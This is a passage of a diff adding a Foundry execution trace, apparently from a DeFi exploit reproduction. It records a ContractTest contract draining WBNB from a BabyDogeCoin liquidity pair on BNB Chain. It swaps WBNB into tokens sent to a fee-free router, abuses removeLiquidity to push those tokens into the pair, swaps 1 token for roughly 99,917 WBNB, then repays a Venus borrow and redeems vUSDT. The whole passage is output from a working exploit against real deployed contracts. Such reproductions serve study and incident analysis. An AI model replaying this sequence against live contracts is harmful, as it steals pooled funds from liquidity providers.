+    │   │   ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 12676226029635003986492 [1.267e22]
+    │   │   ├─ [24420] WBNB::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 12676226029635003986492 [1.267e22])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 12676226029635003986492 [1.267e22])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 12676226029635003986492 [1.267e22]
+    │   │   ├─ [224847] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(12676226029635003986492 [1.267e22], 1, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xc748673057861a797275CD8A068AbB95A902e8de], FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 1687350211 [1.687e9])
+    │   │   │   ├─ [4148] WBNB::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0], 12676226029635003986492 [1.267e22])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0], value: 12676226029635003986492 [1.267e22])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [32602] BabyDogeCoin::balanceOf(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [893] PancakePair::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 15368570059531863550998 [1.536e22], 8851645062257804618917715 [8.851e24], 1687350211 [1.687e9]
+    │   │   │   ├─ [534] WBNB::balanceOf(PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0]) [staticcall]
+    │   │   │   │   └─ ← [Return] 28044796089166867537490 [2.804e22]
+    │   │   │   ├─ [146926] PancakePair::swap(0, 3995449194776453949868940 [3.995e24], FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 0x)
+    │   │   │   │   ├─ [131620] BabyDogeCoin::transfer(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 3995449194776453949868940 [3.995e24])
+    │   │   │   │   │   ├─ emit Transfer(from: PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0], to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 3995449194776453949868940 [3.995e24])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [534] WBNB::balanceOf(PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 28044796089166867537490 [2.804e22]
+    │   │   │   │   ├─ [744] BabyDogeCoin::balanceOf(PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4856195867481350669048775 [4.856e24]
+    │   │   │   │   ├─ emit Sync(reserve0: 28044796089166867537490 [2.804e22], reserve1: 4856195867481350669048775 [4.856e24])
+    │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 12676226029635003986492 [1.267e22], amount1In: 0, amount0Out: 0, amount1Out: 3995449194776453949868940 [3.995e24], to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [32602] BabyDogeCoin::balanceOf(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e]) [staticcall]
+    │   │   │   │   └─ ← [Return] 3995449194776453949868940 [3.995e24]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [381147] FeeFreeRouter::removeLiquidity(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 1000000000 [1e9], 0, 0, BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], 1687350211 [1.687e9])
+    │   │   │   ├─ [644] 0x4693B62E5fc9c0a45F89D62e6300a03C85f43137::getPair(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]) [staticcall]
+    │   │   │   │   └─ ← [Return] BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]
+    │   │   │   ├─ [24002] BabyDogeRouterPair::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 1000000000 [1e9])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 1000000000 [1e9])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [583] BabyDogeRouterPair::allowance(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47]) [staticcall]
+    │   │   │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    │   │   │   ├─ [199793] BabyDogeRouter::removeLiquidity(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 1000000000 [1e9], 0, 0, FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 1687350211 [1.687e9])
+    │   │   │   │   ├─ [23399] BabyDogeRouterPair::transferFrom(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], 1000000000 [1e9])
+    │   │   │   │   │   ├─ emit Transfer(from: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], to: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], value: 1000000000 [1e9])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [173903] BabyDogeRouterPair::burn(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e])
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 130185675428385771211757 [1.301e23]
+    │   │   │   │   │   ├─ [744] BabyDogeCoin::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1210347192209853913353555 [1.21e24]
+    │   │   │   │   │   ├─ [338] 0x4693B62E5fc9c0a45F89D62e6300a03C85f43137::feeTo() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x1551EAC5D2EDAa634f713A526866Ad83b82b5209
+    │   │   │   │   │   ├─ [381] 0x4693B62E5fc9c0a45F89D62e6300a03C85f43137::feeToTreasury() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000001551eac5d2edaa634f713a526866ad83b82b5209
+    │   │   │   │   │   ├─ emit Transfer(from: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], to: 0x0000000000000000000000000000000000000000, value: 1000000000 [1e9])
+    │   │   │   │   │   ├─ [23162] WBNB::transfer(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 335285886 [3.352e8])
+    │   │   │   │   │   │   ├─ emit Transfer(from: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 335285886 [3.352e8])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [111720] BabyDogeCoin::transfer(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 3117181137 [3.117e9])
+    │   │   │   │   │   │   ├─ emit Transfer(from: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 3117181137 [3.117e9])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 130185675428385435925871 [1.301e23]
+    │   │   │   │   │   ├─ [744] BabyDogeCoin::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1210347192209850796172418 [1.21e24]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 130185675428385435925871 [1.301e23], reserve1: 1210347192209850796172418 [1.21e24])
+    │   │   │   │   │   ├─ emit Burn(sender: BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47], amount0: 335285886 [3.352e8], amount1: 3117181137 [3.117e9], to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e])
+    │   │   │   │   │   └─ ← [Return] 335285886 [3.352e8], 3117181137 [3.117e9]
+    │   │   │   │   └─ ← [Return] 3117181137 [3.117e9], 335285886 [3.352e8]
+    │   │   │   ├─ [32602] BabyDogeCoin::balanceOf(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e]) [staticcall]
+    │   │   │   │   └─ ← [Return] 3995449194776457067050077 [3.995e24]
+    │   │   │   ├─ [111674] BabyDogeCoin::transfer(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], 3995449194776457067050077 [3.995e24])
+    │   │   │   │   ├─ emit Transfer(from: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], to: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], value: 3995449194776457067050077 [3.995e24])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WBNB::balanceOf(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e]) [staticcall]
+    │   │   │   │   └─ ← [Return] 335285886 [3.352e8]
+    │   │   │   ├─ [3262] WBNB::transfer(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], 335285886 [3.352e8])
+    │   │   │   │   ├─ emit Transfer(from: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], to: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], value: 335285886 [3.352e8])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ emit LiquidityRemoved(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], param2: WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], param3: 3117181137 [3.117e9], param4: 335285886 [3.352e8], param5: 1000000000 [1e9])
+    │   │   │   └─ ← [Return] 3117181137 [3.117e9], 335285886 [3.352e8]
+    │   │   ├─ [24608] BabyDogeCoin::approve(BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47], 1)
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47], value: 1)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [191805] BabyDogeRouter::swapExactTokensForTokensSupportingFeeOnTransferTokens(1, 1, [0xc748673057861a797275CD8A068AbB95A902e8de, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1687350211 [1.687e9])
+    │   │   │   ├─ [107748] BabyDogeCoin::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], 1)
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], value: 1)
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [540] BabyDogeRouterPair::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 130185675428385435925871 [1.301e23], 1210347192209850796172418 [1.21e24], 1687350211 [1.687e9]
+    │   │   │   ├─ [744] BabyDogeCoin::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   └─ ← [Return] 5205796386986307863222496 [5.205e24]
+    │   │   │   ├─ [32602] BabyDogeCoin::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 9013190079544 [9.013e12]
+    │   │   │   ├─ [36576] BabyDogeRouterPair::swap(99917517589060454877086 [9.991e22], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   ├─ [23162] WBNB::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99917517589060454877086 [9.991e22])
+    │   │   │   │   │   ├─ emit Transfer(from: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 99917517589060454877086 [9.991e22])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [534] WBNB::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 30268157839325316334671 [3.026e22]
+    │   │   │   │   ├─ [744] BabyDogeCoin::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5205796386986307863222496 [5.205e24]
+    │   │   │   │   ├─ emit Sync(reserve0: 30268157839325316334671 [3.026e22], reserve1: 5205796386986307863222496 [5.205e24])
+    │   │   │   │   ├─ emit Swap(sender: BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47], amount0In: 335285886 [3.352e8], amount1In: 3995449194776457067050078 [3.995e24], amount0Out: 99917517589060454877086 [9.991e22], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 99917517589060454877086 [9.991e22]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [9195] WBNB::withdraw(99463293803544699126223 [9.946e22])
+    │   │   │   ├─ [55] ContractTest::receive{value: 99463293803544699126223}()
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ emit Withdrawal(src: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 99463293803544699126223 [9.946e22])
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [26040] vBNB::repayBorrow{value: 99463293803544699126223}()
+    │   │   │   ├─ [14368] Unitroller::repayBorrowAllowed(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99463293803544699126223 [9.946e22])
+    │   │   │   │   ├─ [13682] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::repayBorrowAllowed(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99463293803544699126223 [9.946e22]) [delegatecall]
+    │   │   │   │   │   ├─ [365] vBNB::borrowIndex() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1234470480956995732 [1.234e18]
+    │   │   │   │   │   ├─ [561] 0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63::balanceOf(Unitroller: [0xfD36E2c2a6789Db23113685031d7F16329158384]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 14801404367740170864091001 [1.48e25]
+    │   │   │   │   │   ├─ [1404] vBNB::borrowBalanceStored(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 99463293803544699126223 [9.946e22]
+    │   │   │   │   │   ├─ emit DistributedBorrowerVenus(param0: vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 0, param3: 3541889787173868147384486900713325815 [3.541e36])
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ emit RepayBorrow(payer: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], borrower: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], repayAmount: 99463293803544699126223 [9.946e22], accountBorrows: 0, totalBorrows: 527739152458341217189326 [5.277e23])
+    │   │   │   ├─ [1018] Unitroller::repayBorrowVerify(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99463293803544699126223 [9.946e22], 1234470480956995732 [1.234e18])
+    │   │   │   │   ├─ [399] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::repayBorrowVerify(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99463293803544699126223 [9.946e22], 1234470480956995732 [1.234e18]) [delegatecall]
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Return] 
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [144956] vUSDT::redeemUnderlying(18528422194084249665437559 [1.852e25])
+    │   │   │   ├─ [144151] 0x10FB44C481F87cb4F3ce8DE11fFd16e00EC5B670::redeemUnderlying(18528422194084249665437559 [1.852e25]) [delegatecall]
+    │   │   │   │   ├─ [531] USDT::balanceOf(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 85667293362416235809024304 [8.566e25]
+    │   │   │   │   ├─ [120073] Unitroller::redeemAllowed(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 82945848211975141 [8.294e16])
+    │   │   │   │   │   ├─ [119383] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::redeemAllowed(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 82945848211975141 [8.294e16]) [delegatecall]
+    │   │   │   │   │   │   ├─ [103627] 0x50F618A2EAb0fB55e87682BbFd89e38acb2735cD::getHypotheticalAccountLiquidity(Unitroller: [0xfD36E2c2a6789Db23113685031d7F16329158384], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255], 82945848211975141 [8.294e16], 0) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2312] Unitroller::getAssetsIn(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [1593] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::getAssetsIn(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] [0xfD5840Cd36d94D7229439859C0112a4185BC0255, 0x95c78222B3D6e262426483D42CfA53685A67Ab9D, 0xA07c5b74C9B40447a954e1466938b865b6BBea36]
+    │   │   │   │   │   │   │   │   └─ ← [Return] [0xfD5840Cd36d94D7229439859C0112a4185BC0255, 0x95c78222B3D6e262426483D42CfA53685A67Ab9D, 0xA07c5b74C9B40447a954e1466938b865b6BBea36]
+    │   │   │   │   │   │   │   ├─ [7074] vUSDT::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [5549] vUSDT::delegateToImplementation(0xc37f68e20000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [3664] 0x10FB44C481F87cb4F3ce8DE11fFd16e00EC5B670::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [531] USDT::balanceOf(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 85667293362416235809024304 [8.566e25]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 82945848211975141 [8.294e16], 0, 223379742247415412383608590 [2.233e26]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000126aecf3a44abe50000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b8c680177952a8b8ccef0e
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0, 82945848211975141 [8.294e16], 0, 223379742247415412383608590 [2.233e26]
+    │   │   │   │   │   │   │   ├─ [1550] Unitroller::markets(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [855] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::markets(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true, 800000000000000000 [8e17], true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true, 800000000000000000 [8e17], true
+    │   │   │   │   │   │   │   ├─ [1160] Unitroller::oracle() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [492] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::oracle() [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   │   │   ├─ [15501] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A::getUnderlyingPrice(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [14932] 0xfE872ddeAe0A53486c25ed882786D592e302d80C::getUnderlyingPrice(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [470] vUSDT::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] USDT: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   │   │   │   │   │   ├─ [470] vUSDT::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] USDT: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   │   │   │   │   │   ├─ [10119] 0x1B2103441A0A108daD8848D8F5d790e4D402921F::getUnderlyingPrice(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [9550] 0xEebBfFC42e26386C631914e69B86aD398e91DD7f::getUnderlyingPrice(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [470] vUSDT::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] USDT: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [425] USDT::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [1140] 0xB97Ad0E74fa7d920791E90258A6E2085088b4320::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [298] 0x2dc202b56A03667cC240B290c2BE2b8453E89eA1::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [3143] 0xB97Ad0E74fa7d920791E90258A6E2085088b4320::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1410] 0x2dc202b56A03667cC240B290c2BE2b8453E89eA1::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 34996 [3.499e4], 99995000 [9.999e7], 1687349434 [1.687e9], 1687349434 [1.687e9], 34996 [3.499e4]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 36893488147419138228 [3.689e19], 99995000 [9.999e7], 1687349434 [1.687e9], 1687349434 [1.687e9], 36893488147419138228 [3.689e19]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 999950000000000000 [9.999e17]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 999950000000000000 [9.999e17]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 999950000000000000 [9.999e17]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 999950000000000000 [9.999e17]
+    │   │   │   │   │   │   │   ├─ [7074] vBUSD::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [5549] vBUSD::delegateToImplementation(0xc37f68e20000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [3664] 0x10FB44C481F87cb4F3ce8DE11fFd16e00EC5B670::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [531] BUSD::balanceOf(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 23905043702920857656875424 [2.39e25]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 53675881533888187 [5.367e16], 0, 221538417014331993455068123 [2.215e26]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000beb1ee0bd556bb0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b74095a69aa07cc5f403db
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0, 53675881533888187 [5.367e16], 0, 221538417014331993455068123 [2.215e26]
+    │   │   │   │   │   │   │   ├─ [1550] Unitroller::markets(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [855] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::markets(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true, 825000000000000000 [8.25e17], true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true, 825000000000000000 [8.25e17], true
+    │   │   │   │   │   │   │   ├─ [1160] Unitroller::oracle() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [492] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::oracle() [delegatecall]
